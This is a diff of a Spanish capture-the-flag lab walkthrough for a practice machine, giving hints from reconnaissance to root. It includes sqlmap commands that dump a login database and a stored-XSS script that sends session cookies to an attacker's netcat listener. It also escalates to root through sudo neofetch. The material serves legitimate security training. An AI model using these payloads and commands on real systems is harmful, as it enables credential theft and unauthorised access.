@@ -3,19 +3,9 @@
 :toc: left
 :doctype: book
 
-<<<
+== Despliegue de la máquina
 
-== Escenario final
-
-En esta máquina pondremos en práctica todos los conceptos aprendidos previamente. Será una prueba final diseñada para aplicar los conocimientos adquiridos. El objetivo es lograr la escalada de privilegios hasta obtener acceso como root, partiendo de un entorno que, aunque vulnerable, se asemeja a uno real. Será necesario realizar primero un reconocimiento, seguido de la ejecución de distintos tipos de ataques. Se fomenta la exploración libre, sin seguir guías preestablecidas; no obstante, proporcionaré algunas pistas para avanzar en caso de ser necesario.
-
-<<<
-
-== Solucionar la máquina
-
-En esta guía se darán pistas, principalmente herramientas y cómo usarlas. Mucha suerte.
-
-=== Despliegue de la máquina
+Sería conveniente utilizar una distribución Linux, es recomendable usar Kali Linux.
 
 Como requisito, necesitaremos tener instalado docker y docker-compose.
 
@@ -31,6 +21,14 @@ Necesitaremos descargar primeramente el auto_deploy.sh, el cual se muestra como 
 ----
 $ sudo bash auto_deploy.sh soberbia.tar
 ----
+
+== Escenario final
+
+En esta máquina pondremos en práctica todos los conceptos aprendidos previamente. Será una prueba final diseñada para aplicar los conocimientos adquiridos. El objetivo es lograr la escalada de privilegios hasta obtener acceso como root, partiendo de un entorno que, aunque vulnerable, se asemeja a uno real. Será necesario realizar primero un reconocimiento, seguido de la ejecución de distintos tipos de ataques. Se fomenta la exploración libre, sin seguir guías preestablecidas; no obstante, proporcionaré algunas pistas para avanzar en caso de ser necesario.
+
+== Solucionar la máquina
+
+En esta guía se darán pistas, principalmente herramientas y cómo usarlas. Mucha suerte.
 
 === Reconocimiento
 
@@ -60,8 +58,7 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn (IP) -oG allPorts
 * *(IP)* -> La dirección IP del objetivo.
 * *-oG allPorts* -> Guarda los resultados en formato grepable (fácil de extraer con grep o awk) en el archivo allPorts.
 
-[.text-center]
-image::assets/recon/nmap/nmap.png[nmap]
+image::assets/recon/nmap/nmap.png[nmap,align=center]
 
 Como podemos ver están abiertos los puertos 80 y 22
 ====
@@ -81,8 +78,7 @@ nmap -p (PORTS) -sC -sV (IP)
 * *-sV* -> Hace una detección de versión: intenta identificar el software y su versión en cada puerto abierto (por ejemplo, Apache 2.4.57).
 * *(IP)* -> La dirección IP del objetivo.
 
-[.text-center]
-image::assets/recon/nmap/nmapVer.png[Versiones nmap]
+image::assets/recon/nmap/nmapVer.png[Versiones nmap,align=center]
 
 Una vez identificadas las versiones de los servicios, podemos comprobar si están desactualizadas y si presentan vulnerabilidades conocidas (CVEs) que podamos explotar.
 ====
@@ -92,8 +88,7 @@ Una vez identificadas las versiones de los servicios, podemos comprobar si está
 ====
 Generalmente, los exploits se encuentran en repositorios como GitHub o en bases de datos especializadas como Exploit-DB. Para facilitar esta búsqueda, podemos utilizar herramientas como *https://www.exploit-db.com/searchsploit[searchsploit]*, que permite consultar Exploit-DB desde la terminal y verificar si existen exploits públicos para una versión específica.
 
-[.text-center]
-image::assets/recon/nmap/searchsploit.png[searchsploit]
+image::assets/recon/nmap/searchsploit.png[searchsploit,align=center]
 
 Podemos observar que no se ha encontrado ningún exploit relevante en Exploit-DB. Es importante ser precisos con los términos de búsqueda, ya que searchsploit devuelve todos los resultados relacionados, aunque no estén directamente vinculados con nuestros servicios. Por este motivo puede aparecer algún resultado, pero no necesariamente se aplica a nuestro caso.
 ====
@@ -102,8 +97,7 @@ Podemos observar que no se ha encontrado ningún exploit relevante en Exploit-DB
 
 Cómo ya hemos podido conocer, se trata de una página web sin certificado y con una conexión ssh, por lo que vamos a empezar analizando la página.
 
-[.text-center]
-image::assets/recon/fuzz/pagina.png[pagina login]
+image::assets/recon/fuzz/pagina.png[pagina login,align=center]
 
 .Pista 3
 [%collapsible]
@@ -120,8 +114,7 @@ feroxbuster -u http://(IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-
 * *--depth 0* -> Recursividad infinita.
 * *--timeout 5* -> Define un tiempo de espera de 5 segundos por solicitud antes de que feroxbuster la descarte por falta de respuesta.
 
-[.text-center]
-image::assets/recon/fuzz/feroxbuster.png[feroxbuster]
+image::assets/recon/fuzz/feroxbuster.png[feroxbuster,align=center]
 ====
 
 .Pista 4
@@ -138,8 +131,7 @@ gobuster dir -u (IP) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium
 
 Gobuster es bastante sencillo de usar, pero un defecto que tiene es que no permite recursividad, teniendo que usar scripts para que haga dicha recursividad. Sinceramente veo feroxuster como una mejora de este.
 
-[.text-center]
-image::assets/recon/fuzz/gobuster.png[gobuster]
+image::assets/recon/fuzz/gobuster.png[gobuster,align=center]
 ====
 
 ==== Fase 3
@@ -149,8 +141,7 @@ image::assets/recon/fuzz/gobuster.png[gobuster]
 ====
 Bueno, una vez conociendo la estructura, podemos apreciar que hay un directorio en /dev, que se llama pruebas, o un alias de esta ruta que es /devzone. Esto nos sugiere que los desarrolladores podrían estar utilizando esta ruta para realizar pruebas antes de lanzar la versión final del sitio web. Es común que estas zonas contengan código en desarrollo o funcionalidades no protegidas, lo que podría representar una posible vía de explotación.
 
-[.text-center]
-image::assets/recon/web/pruebas.png[directorio pruebas]
+image::assets/recon/web/pruebas.png[directorio pruebas,align=center]
 ====
 
 .Pista 6
@@ -158,8 +149,7 @@ image::assets/recon/web/pruebas.png[directorio pruebas]
 ====
 Dentro de login.php podemos analizar las tecnologías con *wappalyzer* o con *whatweb* y ver que tecnologías usa.
 
-[.text-center]
-image::assets/recon/web/wappalyzer.png[wappalyzer]
+image::assets/recon/web/wappalyzer.png[wappalyzer,align=center]
 ====
 
 .Pista 7
@@ -170,8 +160,7 @@ image::assets/recon/web/wappalyzer.png[wappalyzer]
 whatweb -a 3 -v http://172.17.0.2/1/2/4/23/dev/pruebas/login.php
 ----
 
-[.text-center]
-image::assets/recon/web/whatweb.png[whatweb]
+image::assets/recon/web/whatweb.png[whatweb,align=center]
 ====
 
 === Ataque
@@ -203,8 +192,7 @@ sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=adm
 ** T: Time-based blind
 ** Q: Inline queries
 
-[.text-center]
-image::assets/atacar/sqli/sqlmap.png[sqlmap recon]
+image::assets/atacar/sqli/sqlmap.png[sqlmap recon,align=center]
 
 Cómo podemos ver el parametro usuario es vulnerable, además más abajo se especifica la versión de Mariadb. Ahora vamos a atacar y obtener las credenciales.
 ====
@@ -222,8 +210,7 @@ sqlmap -u "http://172.17.0.2/1/2/4/23/dev/pruebas/login.php" --data "usuario=adm
 * *--dump* -> Si se encuentra una inyección válida, extraerá y mostrará automáticamente el contenido de las tablas de la base de datos.
 * *--batch* -> Ejecuta en modo automático, sin pedir confirmación para cada acción (muy útil en entornos automatizados o pruebas rápidas).
 
-[.text-center]
-image::assets/atacar/sqli/sqliattack.png[ataque sqli]
+image::assets/atacar/sqli/sqliattack.png[ataque sqli,align=center]
 
 Como podemos ver, hemos obtenido las credenciales de los usuarios admin y test, por lo que podremos pasar el login.
 ====
@@ -237,8 +224,7 @@ Una vez en comentarios, podemos probar cómo funciona el sistema, enviamos un me
 ====
 Podemos hacer un ataque XSS almacenado, asi que podemos obtener las cookies por *netcat* o mirar en Storage al F12.
 
-[.text-center]
-image::assets/atacar/xss/comentarios.png[página comentarios]
+image::assets/atacar/xss/comentarios.png[página comentarios,align=center]
 ====
 
 .Pista 11
@@ -251,8 +237,7 @@ Mediante el comando *nc* nos podemos conectar a los puertos TCP/UDP de un host. 
 nc -lvpn 4444
 ----
 
-[.text-center]
-image::assets/atacar/xss/netcat1.png[comando netcat]
+image::assets/atacar/xss/netcat1.png[comando netcat,align=center]
 ====
 
 .Pista 12
@@ -265,13 +250,11 @@ Después, dentro del comentario meteremos el siguiente script en javascript, que
 <script>fetch('http://(IP atacante):4444?cookie=' + encodeURIComponent(document.cookie));</script>
 ----
 
-[.text-center]
-image::assets/atacar/xss/xss.png[xss script]
+image::assets/atacar/xss/xss.png[xss script,align=center]
 
 Una vez enviado dicho script veremos una cadena muy larga en GET, ese es el contenido de la cookie:
 
-[.text-center]
-image::assets/atacar/xss/netcat2.png[envio de cookies a netcat]
+image::assets/atacar/xss/netcat2.png[envio de cookies a netcat,align=center]
 ====
 
 .Pista 13
@@ -279,8 +262,7 @@ image::assets/atacar/xss/netcat2.png[envio de cookies a netcat]
 ====
 Copiamos esta cadena y la decodificamos con *cyberchef*, una herramienta web muy util para estos casos. Usamos URL decode, para ver el contenido:
 
-[.text-center]
-image::assets/atacar/xss/cyberchef.png[cyberchef]
+image::assets/atacar/xss/cyberchef.png[cyberchef,align=center]
 ====
 
 .Pista 14
@@ -290,13 +272,11 @@ Podemos ver que se almacenan las credenciales de ssh, han puesto el usuario y la
 
 * *Usuario:*
 
-[.text-center]
-image::assets/atacar/xss/CrackUser.png[nombre usuario]
+image::assets/atacar/xss/CrackUser.png[nombre usuario,align=center]
 
 * *Contraseña:*
 
-[.text-center]
-image::assets/atacar/xss/CrackPasswd.png[contraseña]
+image::assets/atacar/xss/CrackPasswd.png[contraseña,align=center]
 
 Una vez hecho esto ya tendríamos las credenciales del ssh. 
 ====
@@ -306,8 +286,7 @@ Una vez hecho esto ya tendríamos las credenciales del ssh.
 ====
 También hay otra forma más sencilla de obtener las cookies, simplemente quería mostrar otra forma para hacer XSS y usar netcat. Le damos a F12 en la página y nos vamos a Storage, ahí podremos obtener los hashes que hemos crackeado antes.
 
-[.text-center]
-image::assets/atacar/xss/F12.png[inspeccionar]
+image::assets/atacar/xss/F12.png[inspeccionar,align=center]
 ====
 
 ==== Fase 6
@@ -317,13 +296,12 @@ Con las credeciales ssh, nos conectamos al servidor:
 .Pista 15
 [%collapsible]
 ====
-[.text-center]
-image::assets/atacar/escalada/ssh.png[conexión con el servidor]
+
+image::assets/atacar/escalada/ssh.png[conexión con el servidor,align=center]
 
 Ahora veremos si tenemos algún privilegio:
 
-[.text-center]
-image::assets/atacar/escalada/sudo-l.png[comando sudo -l]
+image::assets/atacar/escalada/sudo-l.png[comando sudo -l,align=center]
 ====
 
 .Pista 16
@@ -331,8 +309,7 @@ image::assets/atacar/escalada/sudo-l.png[comando sudo -l]
 ====
 Podemos ver que tenemos permisos de administración en neofetch. Por lo que buscamos en https://gtfobins.github.io/gtfobins/neofetch/[GTFOBins] si podemos escalar a través de él.
 
-[.text-center]
-image::assets/atacar/escalada/gtfobins.png[gtfobins]
+image::assets/atacar/escalada/gtfobins.png[gtfobins,align=center]
 ====
 
 .Pista 17
@@ -340,11 +317,8 @@ image::assets/atacar/escalada/gtfobins.png[gtfobins]
 ====
 Podemos ver que, para escalar privilegios, debemos crear un archivo temporal con el contenido exec /bin/sh y pasarlo como configuración a neofetch, ejecutado con sudo. Dicho esto, copiamos y pegamos lo que nos indica y obtenemos privilegios de root.
 
-[.text-center]
-image::assets/atacar/escalada/root.png[somos root]
+image::assets/atacar/escalada/root.png[somos root,align=center]
 ====
-
-<<<
 
 == Conclusión
 
